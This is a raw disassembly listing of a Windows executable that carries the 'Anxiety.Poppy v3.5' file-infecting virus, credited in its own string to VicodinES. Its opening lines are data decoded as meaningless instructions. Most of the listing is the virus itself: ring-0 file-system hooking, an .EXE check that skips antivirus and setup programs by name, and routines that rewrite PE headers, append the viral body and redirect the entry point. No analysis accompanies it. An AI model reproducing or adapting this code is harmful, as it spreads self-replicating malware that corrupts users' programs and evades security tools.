  40b05d:	33 a5 33 b0 33 bd    	xor    -0x42cc4fcd(%ebp),%esp
  40b063:	33 c8                	xor    %eax,%ecx
  40b065:	33 ef                	xor    %edi,%ebp
  40b067:	33 0c 34             	xor    (%esp,%esi,1),%ecx
  40b06a:	3c 34                	cmp    $0x34,%al
  40b06c:	48                   	dec    %eax
  40b06d:	34 4e                	xor    $0x4e,%al
  40b06f:	34 57                	xor    $0x57,%al
  40b071:	34 63                	xor    $0x63,%al
  40b073:	34 6c                	xor    $0x6c,%al
  40b075:	34 71                	xor    $0x71,%al
  40b077:	34 77                	xor    $0x77,%al
  40b079:	34 92                	xor    $0x92,%al
  40b07b:	34 99                	xor    $0x99,%al
  40b07d:	34 a5                	xor    $0xa5,%al
  40b07f:	34 ac                	xor    $0xac,%al
  40b081:	34 b3                	xor    $0xb3,%al
  40b083:	34 c3                	xor    $0xc3,%al
  40b085:	34 c9                	xor    $0xc9,%al
  40b087:	34 ea                	xor    $0xea,%al
  40b089:	34 07                	xor    $0x7,%al
  40b08b:	35 0f 35 18 35       	xor    $0x3518350f,%eax
  40b090:	25 35 2d 35 3f       	and    $0x3f352d35,%eax
  40b095:	35 4d 35 56 35       	xor    $0x3556354d,%eax
  40b09a:	5d                   	pop    %ebp
  40b09b:	35 6d 35 74 35       	xor    $0x3574356d,%eax
  40b0a0:	88 35 8d 35 92 35    	mov    %dh,0x3592358d
  40b0a6:	9f                   	lahf
  40b0a7:	35 a5 35 ad 35       	xor    $0x35ad35a5,%eax
  40b0ac:	b5 35                	mov    $0x35,%ch
  40b0ae:	bb 35 cd 35 d4       	mov    $0xd435cd35,%ebx
  40b0b3:	35 da 35 ec 35       	xor    $0x35ec35da,%eax
  40b0b8:	f7 35 03 36 0a 36    	divl   0x360a3603
  40b0be:	19 36                	sbb    %esi,(%esi)
  40b0c0:	1e                   	push   %ds
  40b0c1:	36 2f                	ss das
  40b0c3:	36 41                	ss inc %ecx
  40b0c5:	36 48                	ss dec %eax
  40b0c7:	36 5d                	ss pop %ebp
  40b0c9:	36 64 36 a6          	ss fs cmpsb %es:(%edi),%ss:(%esi)
  40b0cd:	36 14 37             	ss adc $0x37,%al
  40b0d0:	1e                   	push   %ds
  40b0d1:	37                   	aaa
  40b0d2:	28 37                	sub    %dh,(%edi)
  40b0d4:	32 37                	xor    (%edi),%dh
  40b0d6:	3f                   	aas
  40b0d7:	37                   	aaa
  40b0d8:	7f 37                	jg     0x40b111
  40b0da:	86 37                	xchg   %dh,(%edi)
  40b0dc:	9a 37 ad 37 bd 37 d5 	lcall  $0xd537,$0xbd37ad37
  40b0e3:	37                   	aaa
  40b0e4:	e7 37                	out    %eax,$0x37
  40b0e6:	fc                   	cld
  40b0e7:	37                   	aaa
  40b0e8:	01 38                	add    %edi,(%eax)
  40b0ea:	32 38                	xor    (%eax),%bh
  40b0ec:	3b 38                	cmp    (%eax),%edi
  40b0ee:	42                   	inc    %edx
  40b0ef:	38 68 38             	cmp    %ch,0x38(%eax)
  40b0f2:	76 38                	jbe    0x40b12c
  40b0f4:	7d 38                	jge    0x40b12e
  40b0f6:	8c 38                	mov    %?,(%eax)
  40b0f8:	94                   	xchg   %eax,%esp
  40b0f9:	38 a8 38 b1 38 bc    	cmp    %ch,-0x43c74ec8(%eax)
  40b0ff:	38 c4                	cmp    %al,%ah
  40b101:	38 e8                	cmp    %ch,%al
  40b103:	38 16                	cmp    %dl,(%esi)
  40b105:	39 1d 39 28 39 5d    	cmp    %ebx,0x5d392839
  40b10b:	39 69 39             	cmp    %ebp,0x39(%ecx)
  40b10e:	6f                   	outsl  %ds:(%esi),(%dx)
  40b10f:	39 78 39             	cmp    %edi,0x39(%eax)
  40b112:	8d 39                	lea    (%ecx),%edi
  40b114:	93                   	xchg   %eax,%ebx
  40b115:	39 9f 39 a6 39 af    	cmp    %ebx,-0x50c659c7(%edi)
  40b11b:	39 c4                	cmp    %eax,%esp
  40b11d:	39 f5                	cmp    %esi,%ebp
  40b11f:	39 ff                	cmp    %edi,%edi
  40b121:	39 50 3a             	cmp    %edx,0x3a(%eax)
  40b124:	5d                   	pop    %ebp
  40b125:	3a 62 3a             	cmp    0x3a(%edx),%ah
  40b128:	6a 3a                	push   $0x3a
  40b12a:	73 3a                	jae    0x40b166
  40b12c:	7b 3a                	jnp    0x40b168
  40b12e:	81 3a 8a 3a a3 3a    	cmpl   $0x3aa33a8a,(%edx)
  40b134:	bd 3a c5 3a e5       	mov    $0xe53ac53a,%ebp
  40b139:	3a 79 3b             	cmp    0x3b(%ecx),%bh
  40b13c:	83 3b 9a             	cmpl   $0xffffff9a,(%ebx)
  40b13f:	3b a0 3b a8 3b b1    	cmp    -0x4ec457c5(%eax),%esp
  40b145:	3b b8 3b e2 3b e9    	cmp    -0x16c41dc5(%eax),%edi
  40b14b:	3b 09                	cmp    (%ecx),%ecx
  40b14d:	3c 16                	cmp    $0x16,%al
  40b14f:	3c 25                	cmp    $0x25,%al
  40b151:	3c 2b                	cmp    $0x2b,%al
  40b153:	3c 36                	cmp    $0x36,%al
  40b155:	3c 3d                	cmp    $0x3d,%al
  40b157:	3c 73                	cmp    $0x73,%al
  40b159:	3c 7a                	cmp    $0x7a,%al
  40b15b:	3c a9                	cmp    $0xa9,%al
  40b15d:	3c b0                	cmp    $0xb0,%al
  40b15f:	3c c7                	cmp    $0xc7,%al
  40b161:	3c cd                	cmp    $0xcd,%al
  40b163:	3c d4                	cmp    $0xd4,%al
  40b165:	3c da                	cmp    $0xda,%al
  40b167:	3c e6                	cmp    $0xe6,%al
  40b169:	3c 00                	cmp    $0x0,%al
  40b16b:	3d 05 3d 19 3d       	cmp    $0x3d193d05,%eax
  40b170:	b1 3d                	mov    $0x3d,%cl
  40b172:	b7 3d                	mov    $0x3d,%bh
  40b174:	02 3e                	add    (%esi),%bh
  40b176:	12 3e                	adc    (%esi),%bh
  40b178:	18 3e                	sbb    %bh,(%esi)
  40b17a:	32 3e                	xor    (%esi),%bh
  40b17c:	38 3e                	cmp    %bh,(%esi)
  40b17e:	3e 3e 44             	ds ds inc %esp
  40b181:	3e 4a                	ds dec %edx
  40b183:	3e 50                	ds push %eax
  40b185:	3e 56                	ds push %esi
  40b187:	3e 5c                	ds pop %esp
  40b189:	3e 00 00             	add    %al,%ds:(%eax)
  40b18c:	00 20                	add    %ah,(%eax)
  40b18e:	00 00                	add    %al,(%eax)
  40b190:	0c 00                	or     $0x0,%al
  40b192:	00 00                	add    %al,(%eax)
  40b194:	1c 32                	sbb    $0x32,%al
  40b196:	20 32                	and    %dh,(%edx)
	...
  40b248:	bd 46 92 00 00       	mov    $0x9246,%ebp
  40b24d:	66 2b c9             	sub    %cx,%cx
  40b250:	bf 00 10 00 c0       	mov    $0xc0001000,%edi
  40b255:	b8 ff 00 00 00       	mov    $0xff,%eax
  40b25a:	b9 ff ff ff ff       	mov    $0xffffffff,%ecx
  40b25f:	f2 ae                	repnz scas %es:(%edi),%al
  40b261:	8b d9                	mov    %ecx,%ebx
  40b263:	0b c9                	or     %ecx,%ecx
  40b265:	0f 84 80 00 00 00    	je     0x40b2eb
  40b26b:	81 ff 00 c0 00 c0    	cmp    $0xc000c000,%edi
  40b271:	73 78                	jae    0x40b2eb
  40b273:	90                   	nop
  40b274:	90                   	nop
  40b275:	90                   	nop
  40b276:	90                   	nop
  40b277:	f3 ae                	repz scas %es:(%edi),%al
  40b279:	0b c9                	or     %ecx,%ecx
  40b27b:	74 6e                	je     0x40b2eb
  40b27d:	90                   	nop
  40b27e:	90                   	nop
  40b27f:	90                   	nop
  40b280:	90                   	nop
  40b281:	2b d9                	sub    %ecx,%ebx
  40b283:	81 fb 77 06 00 00    	cmp    $0x677,%ebx
  40b289:	72 d4                	jb     0x40b25f
  40b28b:	2b fb                	sub    %ebx,%edi
  40b28d:	b8 7f 15 00 c0       	mov    $0xc000157f,%eax
  40b292:	8b 18                	mov    (%eax),%ebx
  40b294:	81 7b 0c 56 4d 4d 20 	cmpl   $0x204d4d56,0xc(%ebx)
  40b29b:	75 4e                	jne    0x40b2eb
  40b29d:	90                   	nop
  40b29e:	90                   	nop
  40b29f:	90                   	nop
  40b2a0:	90                   	nop
  40b2a1:	8b 5b 30             	mov    0x30(%ebx),%ebx
  40b2a4:	8d 43 3c             	lea    0x3c(%ebx),%eax
  40b2a7:	89 85 c1 20 40 00    	mov    %eax,0x4020c1(%ebp)
  40b2ad:	8b 00                	mov    (%eax),%eax
  40b2af:	89 85 d2 20 40 00    	mov    %eax,0x4020d2(%ebp)
  40b2b5:	8d 87 b2 00 00 00    	lea    0xb2(%edi),%eax
  40b2bb:	89 43 3c             	mov    %eax,0x3c(%ebx)
  40b2be:	8d b5 02 20 40 00    	lea    0x402002(%ebp),%esi
  40b2c4:	b9 77 05 00 00       	mov    $0x577,%ecx
  40b2c9:	89 bd b6 20 40 00    	mov    %edi,0x4020b6(%ebp)
  40b2cf:	81 ad b6 20 40 00 02 	subl   $0x402002,0x4020b6(%ebp)
  40b2d6:	20 40 00 
  40b2d9:	89 bd 2c 21 40 00    	mov    %edi,0x40212c(%ebp)
  40b2df:	81 ad 2c 21 40 00 02 	subl   $0x402002,0x40212c(%ebp)
  40b2e6:	20 40 00 
  40b2e9:	f3 a4                	rep movsb %ds:(%esi),%es:(%edi)
  40b2eb:	8c 8d b2 20 40 00    	mov    %cs,0x4020b2(%ebp)
  40b2f1:	eb 00                	jmp    0x40b2f3
  40b2f3:	ea 90 1c 40 00 37 01 	ljmp   $0x137,$0x401c90
  40b2fa:	60                   	pusha
  40b2fb:	ba e1 9e c0 bf       	mov    $0xbfc09ee1,%edx
  40b300:	8b 82 d2 20 40 00    	mov    0x4020d2(%edx),%eax
  40b306:	a3 64 e3 00 c0       	mov    %eax,0xc000e364
  40b30b:	8c 8a d6 20 40 00    	mov    %cs,0x4020d6(%edx)
  40b311:	e8 08 00 00 00       	call   0x40b31e
  40b316:	61                   	popa
  40b317:	ea 9c 2c 00 c0 28 00 	ljmp   $0x28,$0xc0002c9c
  40b31e:	8d 82 22 21 40 00    	lea    0x402122(%edx),%eax
  40b324:	52                   	push   %edx
  40b325:	50                   	push   %eax
  40b326:	cd 20                	int    $0x20
  40b328:	67 00 40 00          	add    %al,0x0(%bx,%si)
  40b32c:	83 c4 04             	add    $0x4,%esp
  40b32f:	5a                   	pop    %edx
  40b330:	89 82 03 25 40 00    	mov    %eax,0x402503(%edx)
  40b336:	52                   	push   %edx
  40b337:	b8 00 d5 00 00       	mov    $0xd500,%eax
  40b33c:	2b c9                	sub    %ecx,%ecx
  40b33e:	bb 02 00 00 00       	mov    $0x2,%ebx
  40b343:	ba 12 00 00 00       	mov    $0x12,%edx
  40b348:	cd 20                	int    $0x20
  40b34a:	32 00                	xor    (%eax),%al
  40b34c:	40                   	inc    %eax
  40b34d:	00 5a 72             	add    %bl,0x72(%edx)
  40b350:	16                   	push   %ss
  40b351:	90                   	nop
  40b352:	90                   	nop
  40b353:	90                   	nop
  40b354:	90                   	nop
  40b355:	cd 20                	int    $0x20
  40b357:	32 00                	xor    (%eax),%al
  40b359:	40                   	inc    %eax
  40b35a:	00 b8 00 d7 00 00    	add    %bh,0xd700(%eax)
  40b360:	cd 20                	int    $0x20
  40b362:	32 00                	xor    (%eax),%al
  40b364:	40                   	inc    %eax
  40b365:	00 5a c3             	add    %bl,-0x3d(%edx)
  40b368:	55                   	push   %ebp
  40b369:	8b ec                	mov    %esp,%ebp
  40b36b:	83 ec 20             	sub    $0x20,%esp
  40b36e:	53                   	push   %ebx
  40b36f:	56                   	push   %esi
  40b370:	57                   	push   %edi
  40b371:	bf e1 9e c0 bf       	mov    $0xbfc09ee1,%edi
  40b376:	80 bf 79 25 40 00 01 	cmpb   $0x1,0x402579(%edi)
  40b37d:	0f 84 ad 03 00 00    	je     0x40b730
  40b383:	83 7d 0c 24          	cmpl   $0x24,0xc(%ebp)
  40b387:	0f 85 a3 03 00 00    	jne    0x40b730
  40b38d:	c6 87 79 25 40 00 01 	movb   $0x1,0x402579(%edi)
  40b394:	60                   	pusha
  40b395:	8d b7 ca 25 40 00    	lea    0x4025ca(%edi),%esi
  40b39b:	8b 45 10             	mov    0x10(%ebp),%eax
  40b39e:	3c ff                	cmp    $0xff,%al
  40b3a0:	74 0d                	je     0x40b3af
  40b3a2:	90                   	nop
  40b3a3:	90                   	nop
  40b3a4:	90                   	nop
  40b3a5:	90                   	nop
  40b3a6:	04 40                	add    $0x40,%al
  40b3a8:	88 06                	mov    %al,(%esi)
  40b3aa:	46                   	inc    %esi
  40b3ab:	c6 06 3a             	movb   $0x3a,(%esi)
  40b3ae:	46                   	inc    %esi
  40b3af:	2b c0                	sub    %eax,%eax
  40b3b1:	89 87 92 25 40 00    	mov    %eax,0x402592(%edi)
  40b3b7:	89 87 96 25 40 00    	mov    %eax,0x402596(%edi)
  40b3bd:	50                   	push   %eax
  40b3be:	b8 ff 00 00 00       	mov    $0xff,%eax
  40b3c3:	50                   	push   %eax
  40b3c4:	8b 5d 1c             	mov    0x1c(%ebp),%ebx
  40b3c7:	8b 43 0c             	mov    0xc(%ebx),%eax
  40b3ca:	83 c0 04             	add    $0x4,%eax
  40b3cd:	50                   	push   %eax
  40b3ce:	8b c6                	mov    %esi,%eax
  40b3d0:	50                   	push   %eax
  40b3d1:	cd 20                	int    $0x20
  40b3d3:	41                   	inc    %ecx
  40b3d4:	00 40 00             	add    %al,0x0(%eax)
  40b3d7:	83 c4 10             	add    $0x10,%esp
  40b3da:	03 f0                	add    %eax,%esi
  40b3dc:	c6 06 00             	movb   $0x0,(%esi)
  40b3df:	81 7e fc 2e 45 58 45 	cmpl   $0x4558452e,-0x4(%esi)
  40b3e6:	0f 85 3c 03 00 00    	jne    0x40b728
  40b3ec:	81 7e f8 49 4e 33 32 	cmpl   $0x32334e49,-0x8(%esi)
  40b3f3:	0f 84 2f 03 00 00    	je     0x40b728
  40b3f9:	81 7e f8 41 4e 33 32 	cmpl   $0x32334e41,-0x8(%esi)
  40b400:	0f 84 22 03 00 00    	je     0x40b728
  40b406:	81 7e f8 4e 54 39 35 	cmpl   $0x3539544e,-0x8(%esi)
  40b40d:	0f 84 15 03 00 00    	je     0x40b728
  40b413:	81 7e f8 4f 54 39 35 	cmpl   $0x3539544f,-0x8(%esi)
  40b41a:	0f 84 08 03 00 00    	je     0x40b728
  40b420:	81 7e f8 4f 4c 39 35 	cmpl   $0x35394c4f,-0x8(%esi)
  40b427:	0f 84 fb 02 00 00    	je     0x40b728
  40b42d:	81 7e f8 58 44 39 35 	cmpl   $0x35394458,-0x8(%esi)
  40b434:	0f 84 ee 02 00 00    	je     0x40b728
  40b43a:	81 7e f8 56 50 33 32 	cmpl   $0x32335056,-0x8(%esi)
  40b441:	0f 84 e1 02 00 00    	je     0x40b728
  40b447:	81 7e f8 56 57 33 32 	cmpl   $0x32335756,-0x8(%esi)
  40b44e:	0f 84 d4 02 00 00    	je     0x40b728
  40b454:	81 7e f8 50 57 33 32 	cmpl   $0x32335750,-0x8(%esi)
  40b45b:	0f 84 c7 02 00 00    	je     0x40b728
  40b461:	81 7e f8 45 54 55 50 	cmpl   $0x50555445,-0x8(%esi)
  40b468:	0f 84 ba 02 00 00    	je     0x40b728
  40b46e:	b8 00 d5 00 00       	mov    $0xd500,%eax
  40b473:	2b c9                	sub    %ecx,%ecx
  40b475:	8d b7 ca 25 40 00    	lea    0x4025ca(%edi),%esi
  40b47b:	bb 02 00 00 00       	mov    $0x2,%ebx
  40b480:	ba 01 00 00 00       	mov    $0x1,%edx
  40b485:	cd 20                	int    $0x20
  40b487:	32 00                	xor    (%eax),%al
  40b489:	40                   	inc    %eax
  40b48a:	00 0f                	add    %cl,(%edi)
  40b48c:	82 97 02 00 00 8b d8 	adcb   $0xd8,-0x74fffffe(%edi)
  40b493:	b9 04 00 00 00       	mov    $0x4,%ecx
  40b498:	ba 3c 00 00 00       	mov    $0x3c,%edx
  40b49d:	b8 00 d6 00 00       	mov    $0xd600,%eax
  40b4a2:	8d b7 82 25 40 00    	lea    0x402582(%edi),%esi
  40b4a8:	cd 20                	int    $0x20
  40b4aa:	32 00                	xor    (%eax),%al
  40b4ac:	40                   	inc    %eax
  40b4ad:	00 b9 04 00 00 00    	add    %bh,0x4(%ecx)
  40b4b3:	8b 97 82 25 40 00    	mov    0x402582(%edi),%edx
  40b4b9:	b8 00 d6 00 00       	mov    $0xd600,%eax
  40b4be:	8d b7 ca 25 40 00    	lea    0x4025ca(%edi),%esi
  40b4c4:	cd 20                	int    $0x20
  40b4c6:	32 00                	xor    (%eax),%al
  40b4c8:	40                   	inc    %eax
  40b4c9:	00 81 3e 50 45 00    	add    %al,0x45503e(%ecx)
  40b4cf:	00 0f                	add    %cl,(%edi)
  40b4d1:	85 47 02             	test   %eax,0x2(%edi)
  40b4d4:	00 00                	add    %al,(%eax)
  40b4d6:	b9 04 00 00 00       	mov    $0x4,%ecx
  40b4db:	8b 97 82 25 40 00    	mov    0x402582(%edi),%edx
  40b4e1:	83 c2 34             	add    $0x34,%edx
  40b4e4:	b8 00 d6 00 00       	mov    $0xd600,%eax
  40b4e9:	8d b7 86 25 40 00    	lea    0x402586(%edi),%esi
  40b4ef:	cd 20                	int    $0x20
  40b4f1:	32 00                	xor    (%eax),%al
  40b4f3:	40                   	inc    %eax
  40b4f4:	00 b9 04 00 00 00    	add    %bh,0x4(%ecx)
  40b4fa:	8b 97 82 25 40 00    	mov    0x402582(%edi),%edx
  40b500:	83 c2 28             	add    $0x28,%edx
  40b503:	b8 00 d6 00 00       	mov    $0xd600,%eax
  40b508:	8d b7 ae 20 40 00    	lea    0x4020ae(%edi),%esi
  40b50e:	cd 20                	int    $0x20
  40b510:	32 00                	xor    (%eax),%al
  40b512:	40                   	inc    %eax
  40b513:	00 8b 87 86 25 40    	add    %cl,0x40258687(%ebx)
  40b519:	00 01                	add    %al,(%ecx)
  40b51b:	87 ae 20 40 00 b9    	xchg   %ebp,-0x46ffbfe0(%esi)
  40b521:	04 00                	add    $0x0,%al
  40b523:	00 00                	add    %al,(%eax)
  40b525:	8b 97 82 25 40 00    	mov    0x402582(%edi),%edx
  40b52b:	83 c2 38             	add    $0x38,%edx
  40b52e:	8d b7 8a 25 40 00    	lea    0x40258a(%edi),%esi
  40b534:	b8 00 d6 00 00       	mov    $0xd600,%eax
  40b539:	cd 20                	int    $0x20
  40b53b:	32 00                	xor    (%eax),%al
  40b53d:	40                   	inc    %eax
  40b53e:	00 b9 04 00 00 00    	add    %bh,0x4(%ecx)
  40b544:	8b 97 82 25 40 00    	mov    0x402582(%edi),%edx
  40b54a:	83 c2 3c             	add    $0x3c,%edx
  40b54d:	8d b7 8e 25 40 00    	lea    0x40258e(%edi),%esi
  40b553:	b8 00 d6 00 00       	mov    $0xd600,%eax
  40b558:	cd 20                	int    $0x20
  40b55a:	32 00                	xor    (%eax),%al
  40b55c:	40                   	inc    %eax
  40b55d:	00 b9 02 00 00 00    	add    %bh,0x2(%ecx)
  40b563:	8b 97 82 25 40 00    	mov    0x402582(%edi),%edx
  40b569:	83 c2 14             	add    $0x14,%edx
  40b56c:	b8 00 d6 00 00       	mov    $0xd600,%eax
  40b571:	8d b7 92 25 40 00    	lea    0x402592(%edi),%esi
  40b577:	cd 20                	int    $0x20
  40b579:	32 00                	xor    (%eax),%al
  40b57b:	40                   	inc    %eax
  40b57c:	00 b9 02 00 00 00    	add    %bh,0x2(%ecx)
  40b582:	8b 97 82 25 40 00    	mov    0x402582(%edi),%edx
  40b588:	83 c2 06             	add    $0x6,%edx
  40b58b:	b8 00 d6 00 00       	mov    $0xd600,%eax
  40b590:	8d b7 96 25 40 00    	lea    0x402596(%edi),%esi
  40b596:	cd 20                	int    $0x20
  40b598:	32 00                	xor    (%eax),%al
  40b59a:	40                   	inc    %eax
  40b59b:	00 8b 06 b9 28 00    	add    %cl,0x28b906(%ebx)
  40b5a1:	00 00                	add    %al,(%eax)
  40b5a3:	f7 e1                	mul    %ecx
  40b5a5:	8b 97 92 25 40 00    	mov    0x402592(%edi),%edx
  40b5ab:	03 d0                	add    %eax,%edx
  40b5ad:	2b d1                	sub    %ecx,%edx
  40b5af:	03 97 82 25 40 00    	add    0x402582(%edi),%edx
  40b5b5:	83 c2 18             	add    $0x18,%edx
  40b5b8:	89 97 9a 25 40 00    	mov    %edx,0x40259a(%edi)
  40b5be:	b8 00 d6 00 00       	mov    $0xd600,%eax
  40b5c3:	8d b7 a2 25 40 00    	lea    0x4025a2(%edi),%esi
  40b5c9:	cd 20                	int    $0x20
  40b5cb:	32 00                	xor    (%eax),%al
  40b5cd:	40                   	inc    %eax
  40b5ce:	00 80 bf a9 25 40    	add    %al,0x4025a9bf(%eax)
  40b5d4:	00 ff                	add    %bh,%bh
  40b5d6:	0f 84 41 01 00 00    	je     0x40b71d
  40b5dc:	c6 87 a9 25 40 00 ff 	movb   $0xff,0x4025a9(%edi)
  40b5e3:	8b 87 aa 25 40 00    	mov    0x4025aa(%edi),%eax
  40b5e9:	03 87 ae 25 40 00    	add    0x4025ae(%edi),%eax
  40b5ef:	89 87 7e 25 40 00    	mov    %eax,0x40257e(%edi)
  40b5f5:	03 87 86 25 40 00    	add    0x402586(%edi),%eax
  40b5fb:	2d 02 20 40 00       	sub    $0x402002,%eax
  40b600:	89 87 03 20 40 00    	mov    %eax,0x402003(%edi)
  40b606:	2b d2                	sub    %edx,%edx
  40b608:	b8 77 05 00 00       	mov    $0x577,%eax
  40b60d:	8b 8f 8e 25 40 00    	mov    0x40258e(%edi),%ecx
  40b613:	f7 f1                	div    %ecx
  40b615:	40                   	inc    %eax
  40b616:	f7 e1                	mul    %ecx
  40b618:	50                   	push   %eax
  40b619:	03 87 aa 25 40 00    	add    0x4025aa(%edi),%eax
  40b61f:	89 87 b2 25 40 00    	mov    %eax,0x4025b2(%edi)
  40b625:	2b d2                	sub    %edx,%edx
  40b627:	b8 77 05 00 00       	mov    $0x577,%eax
  40b62c:	8b 8f 8a 25 40 00    	mov    0x40258a(%edi),%ecx
  40b632:	f7 f1                	div    %ecx
  40b634:	40                   	inc    %eax
  40b635:	f7 e1                	mul    %ecx
  40b637:	50                   	push   %eax
  40b638:	03 87 aa 25 40 00    	add    0x4025aa(%edi),%eax
  40b63e:	89 87 aa 25 40 00    	mov    %eax,0x4025aa(%edi)
  40b644:	8b 87 aa 25 40 00    	mov    0x4025aa(%edi),%eax
  40b64a:	03 87 ae 25 40 00    	add    0x4025ae(%edi),%eax
  40b650:	89 87 9e 25 40 00    	mov    %eax,0x40259e(%edi)
  40b656:	c7 87 c6 25 40 00 40 	movl   $0xe0000040,0x4025c6(%edi)
  40b65d:	00 00 e0 
  40b660:	b9 04 00 00 00       	mov    $0x4,%ecx
  40b665:	8b 97 82 25 40 00    	mov    0x402582(%edi),%edx
  40b66b:	83 c2 50             	add    $0x50,%edx
  40b66e:	b8 01 d6 00 00       	mov    $0xd601,%eax
  40b673:	8d b7 9e 25 40 00    	lea    0x40259e(%edi),%esi
  40b679:	cd 20                	int    $0x20
  40b67b:	32 00                	xor    (%eax),%al
  40b67d:	40                   	inc    %eax
  40b67e:	00 b9 28 00 00 00    	add    %bh,0x28(%ecx)
  40b684:	8b 97 9a 25 40 00    	mov    0x40259a(%edi),%edx
  40b68a:	b8 01 d6 00 00       	mov    $0xd601,%eax
  40b68f:	8d b7 a2 25 40 00    	lea    0x4025a2(%edi),%esi
  40b695:	cd 20                	int    $0x20
  40b697:	32 00                	xor    (%eax),%al
  40b699:	40                   	inc    %eax
  40b69a:	00 66 b9             	add    %ah,-0x47(%esi)
  40b69d:	40                   	inc    %eax
  40b69e:	00 c7                	add    %al,%bh
  40b6a0:	87 e0                	xchg   %esp,%eax
  40b6a2:	20 40 00             	and    %al,0x0(%eax)
  40b6a5:	cd 20                	int    $0x20
  40b6a7:	67 00 66 89          	add    %ah,-0x77(%bp)
  40b6ab:	8f                   	(bad)
  40b6ac:	e4 20                	in     $0x20,%al
  40b6ae:	40                   	inc    %eax
  40b6af:	00 c7                	add    %al,%bh
  40b6b1:	87 8b 21 40 00 cd    	xchg   %ecx,-0x32ffbfdf(%ebx)
  40b6b7:	20 41 00             	and    %al,0x0(%ecx)
  40b6ba:	66 89 8f 8f 21 40 00 	mov    %cx,0x40218f(%edi)
  40b6c1:	8d b7 31 25 40 00    	lea    0x402531(%edi),%esi
  40b6c7:	b9 12 00 00 00       	mov    $0x12,%ecx
  40b6cc:	ad                   	lods   %ds:(%esi),%eax
  40b6cd:	03 c7                	add    %edi,%eax
  40b6cf:	c7 00 cd 20 32 00    	movl   $0x3220cd,(%eax)
  40b6d5:	66 c7 40 04 40 00    	movw   $0x40,0x4(%eax)
  40b6db:	e2 ef                	loop   0x40b6cc
  40b6dd:	59                   	pop    %ecx
  40b6de:	b8 01 d6 00 00       	mov    $0xd601,%eax
  40b6e3:	8b 97 aa 25 40 00    	mov    0x4025aa(%edi),%edx
  40b6e9:	03 97 b6 25 40 00    	add    0x4025b6(%edi),%edx
  40b6ef:	2b d1                	sub    %ecx,%edx
  40b6f1:	59                   	pop    %ecx
  40b6f2:	8d b7 02 20 40 00    	lea    0x402002(%edi),%esi
  40b6f8:	ff 15 6c c2 01 c0    	call   *0xc001c26c
  40b6fe:	b9 04 00 00 00       	mov    $0x4,%ecx
  40b703:	8b 97 82 25 40 00    	mov    0x402582(%edi),%edx
  40b709:	83 c2 28             	add    $0x28,%edx
  40b70c:	b8 01 d6 00 00       	mov    $0xd601,%eax
  40b711:	8d b7 7e 25 40 00    	lea    0x40257e(%edi),%esi
  40b717:	cd 20                	int    $0x20
  40b719:	32 00                	xor    (%eax),%al
  40b71b:	40                   	inc    %eax
  40b71c:	00 b8 00 d7 00 00    	add    %bh,0xd700(%eax)
  40b722:	cd 20                	int    $0x20
  40b724:	32 00                	xor    (%eax),%al
  40b726:	40                   	inc    %eax
  40b727:	00 61 c6             	add    %ah,-0x3a(%ecx)
  40b72a:	87 79 25             	xchg   %edi,0x25(%ecx)
  40b72d:	40                   	inc    %eax
  40b72e:	00 00                	add    %al,(%eax)
  40b730:	8b 45 1c             	mov    0x1c(%ebp),%eax
  40b733:	50                   	push   %eax
  40b734:	8b 45 18             	mov    0x18(%ebp),%eax
  40b737:	50                   	push   %eax
  40b738:	8b 45 14             	mov    0x14(%ebp),%eax
  40b73b:	50                   	push   %eax
  40b73c:	8b 45 10             	mov    0x10(%ebp),%eax
  40b73f:	50                   	push   %eax
  40b740:	8b 45 0c             	mov    0xc(%ebp),%eax
  40b743:	50                   	push   %eax
  40b744:	8b 45 08             	mov    0x8(%ebp),%eax
  40b747:	50                   	push   %eax
  40b748:	b8 68 80 3c c1       	mov    $0xc13c8068,%eax
  40b74d:	ff 10                	call   *(%eax)
  40b74f:	83 c4 18             	add    $0x18,%esp
  40b752:	5f                   	pop    %edi
  40b753:	5e                   	pop    %esi
  40b754:	5b                   	pop    %ebx
  40b755:	c9                   	leave
  40b756:	c3                   	ret
  40b757:	41                   	inc    %ecx
  40b758:	6e                   	outsb  %ds:(%esi),(%dx)
  40b759:	78 69                	js     0x40b7c4
  40b75b:	65 74 79             	gs je  0x40b7d7
  40b75e:	2e 50                	cs push %eax
  40b760:	6f                   	outsl  %ds:(%esi),(%dx)
  40b761:	70 70                	jo     0x40b7d3
  40b763:	79 20                	jns    0x40b785
  40b765:	76 33                	jbe    0x40b79a
  40b767:	2e 35 20 62 79 20    	cs xor $0x20796220,%eax
  40b76d:	56                   	push   %esi
  40b76e:	69 63 6f 64 69 6e 45 	imul   $0x456e6964,0x6f(%ebx),%esp
  40b775:	53                   	push   %ebx
  40b776:	00 3f                	add    %bh,(%edi)
  40b778:	22 40 00             	and    0x0(%eax),%al
  40b77b:	62 22                	bound  %esp,(%edx)
  40b77d:	40                   	inc    %eax
  40b77e:	00 7e 22             	add    %bh,0x22(%esi)
  40b781:	40                   	inc    %eax
  40b782:	00 a9 22 40 00 c8    	add    %ch,-0x37ffbfde(%ecx)
  40b788:	22 40 00             	and    0x0(%eax),%al
  40b78b:	f3 22 40 00          	repz and 0x0(%eax),%al
  40b78f:	12 23                	adc    (%ebx),%ah
  40b791:	40                   	inc    %eax
  40b792:	00 31                	add    %dh,(%ecx)
  40b794:	23 40 00             	and    0x0(%eax),%eax
  40b797:	50                   	push   %eax
  40b798:	23 40 00             	and    0x0(%eax),%eax
  40b79b:	83 23 40             	andl   $0x40,(%ebx)
  40b79e:	00 33                	add    %dh,(%ebx)
  40b7a0:	24 40                	and    $0x40,%al
  40b7a2:	00 4f 24             	add    %cl,0x24(%edi)
  40b7a5:	40                   	inc    %eax
  40b7a6:	00 b2 24 40 00 d1    	add    %dh,-0x2effbfdc(%edx)
  40b7ac:	24 40                	and    $0x40,%al
  40b7ae:	00 dc                	add    %bl,%ah
  40b7b0:	24 40                	and    $0x40,%al
  40b7b2:	00 02                	add    %al,(%edx)
  40b7b4:	21 40 00             	and    %eax,0x0(%eax)
  40b7b7:	0f 21 40             	mov    %db0,%eax
  40b7ba:	00 1a                	add    %bl,(%edx)
  40b7bc:	21 40 00             	and    %eax,0x0(%eax)
  40b7bf:	01 ff                	add    %edi,%edi
  40b7c1:	ff                   	(bad)
  40b7c2:	ff                   	(bad)
  40b7c3:	ff 48 b2             	decl   -0x4e(%eax)
  40b7c6:	00 00                	add    %al,(%eax)
  40b7c8:	80 00 00             	addb   $0x0,(%eax)
  40b7cb:	00 00                	add    %al,(%eax)
  40b7cd:	00 40 00             	add    %al,0x0(%eax)
  40b7d0:	00 10                	add    %dl,(%eax)
  40b7d2:	00 00                	add    %al,(%eax)
  40b7d4:	00 10                	add    %dl,(%eax)
  40b7d6:	00 00                	add    %al,(%eax)
